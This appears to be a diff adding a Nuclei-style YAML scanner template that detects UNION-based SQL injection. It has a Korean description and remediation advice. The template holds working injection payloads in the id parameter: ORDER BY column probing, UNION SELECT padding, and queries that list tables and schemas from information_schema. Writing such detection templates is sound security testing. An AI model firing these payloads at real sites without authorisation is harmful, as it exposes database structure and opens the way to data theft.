@@ -1,0 +1,54 @@
+id: sqli-union-based
+
+info:
+  name: UNION-Based SQL Injection
+  author: security-researcher
+  severity: critical
+  description: |
+    UNION 명령을 이용한 SQL 인젝션 취약점을 탐지합니다.
+    다른 테이블의 데이터를 추출하거나 데이터베이스 구조를 파악할 수 있습니다.
+  tags: sqli,union,injection,data-extraction
+  remediation: |
+    - Prepared Statement 사용
+    - 컬럼 수 노출 방지
+    - 에러 메시지 비활성화
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1 ORDER BY 1--"
+      - "{{BaseURL}}?id=1 ORDER BY 10--"
+      - "{{BaseURL}}?id=-1 UNION SELECT NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT NULL,NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 1,2,3--"
+      - "{{BaseURL}}?id=-1 UNION ALL SELECT 1,2,3--"
+      - "{{BaseURL}}?id=-1 UNION SELECT 'sqli-test',NULL,NULL--"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "sqli-test"
+
+      - type: regex
+        part: body
+        regex:
+          - "UNION.*SELECT.*FROM"
+        condition: or
+        case-insensitive: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=-1 UNION SELECT table_name,NULL FROM information_schema.tables--"
+      - "{{BaseURL}}?id=-1 UNION SELECT schema_name,NULL FROM information_schema.schemata--"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "information_schema|mysql|performance_schema|sys"
+          - "users|admin|account|member|customer"
+        condition: or
+        case-insensitive: true
